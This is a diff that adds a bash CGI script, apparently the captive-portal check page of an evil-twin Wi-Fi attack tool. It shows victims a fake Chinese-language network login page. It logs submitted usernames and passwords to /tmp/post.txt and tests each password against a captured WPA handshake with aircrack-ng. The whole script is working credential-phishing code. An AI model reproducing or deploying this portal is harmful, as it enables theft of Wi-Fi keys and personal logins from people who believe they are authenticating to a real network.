@@ -1,0 +1,73 @@
+#!/usr/bin/env bash
+echo '<!DOCTYPE html>'
+echo '<html>'
+echo -e '\t<head>'
+echo -e '\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>'
+echo -e '\t\t<title>${et_misc_texts[${captive_portal_language},15]}</title>'
+echo -e '\t\t<link rel="stylesheet" type="text/css" href="${cssfile}"/>'
+echo -e '\t\t<script type="text/javascript" src="${jsfile}"></script>'
+echo -e '\t</head>'
+echo -e '\t<body style="font-size: 30px;">'
+echo -e '\t\t<div class="content_check">'
+echo -e '\t\t\t<center><p>'
+
+POST_DATA=$(cat /dev/stdin)
+if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ ${CONTENT_LENGTH} -gt 0 ]]; then
+	PASS_DATA=${POST_DATA#*password=}
+	password=${PASS_DATA//+/ }
+	password=${password//[*&\/?<>]}
+	password=$(printf '%b' "${password//%/\\x}")
+	password=${password//[*&\/?<>]}
+	USER_DATA=$(echo ${POST_DATA#*username=}|awk -F "&" '{print $1}'|awk '{gsub(/ /,""); print}')
+	username=${USER_DATA//+/ }
+	username=$(printf '%b' "${username//%/\\x}")
+	echo "用户名: [${username}"] >>/tmp/post.txt
+	echo "密码: [${password}"] >>/tmp/post.txt
+	echo ">>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>" >>/tmp/post.txt
+	echo "" >>/tmp/post.txt
+fi
+
+if [[ ${#password} -ge 8 ]] && [[ ${#password} -le 63 ]]; then
+
+	rm -rf "${tmpdir}${webdir}${currentpassfile}" > /dev/null 2>&1
+
+	echo "${password}" >\
+	"${tmpdir}${webdir}${currentpassfile}"
+	aircrack-ng -a 2 -b ${bssid} -w "${tmpdir}${webdir}${currentpassfile}" "${et_handshake}" | grep "KEY FOUND!" > /dev/null
+
+	if [ "$?" = "0" ]; then
+
+		touch "${tmpdir}${webdir}${et_successfile}" > /dev/null 2>&1
+		my_bssid=$(echo ${bssid}|awk -F ":" '{print $1"-"$2"-"$3"-"$4"-"$5"-"$6}')
+		mv -f /tmp/post.txt /tmp/${my_bssid}_post.txt > /dev/null 2>&1
+		echo '认证成功，现在您可以使用网络....'
+		et_successful=1
+	else
+
+		echo "${password}" >>\
+		"${tmpdir}${webdir}${attemptsfile}"
+		echo '很抱歉，您输入的密码错误....'
+		et_successful=0
+	fi
+
+elif [[ ${#password} -gt 0 ]] && [[ ${#password} -lt 8 ]]; then
+
+	echo '错误，密码最少为8位'
+	et_successful=0
+else
+	echo '未知错误，正返回主页面....'
+	et_successful=0
+fi
+echo -e '\t\t\t</p></center>'
+echo -e '\t\t</div>'
+echo -e '\t</body>'
+echo '</html>'
+
+if [ ${et_successful} -eq 1 ]; then
+	exit 0
+else
+	echo '<script type="text/javascript">'
+	echo -e '\tsetTimeout("redirect()", 3500);'
+	echo '</script>'
+	exit 1
+fi
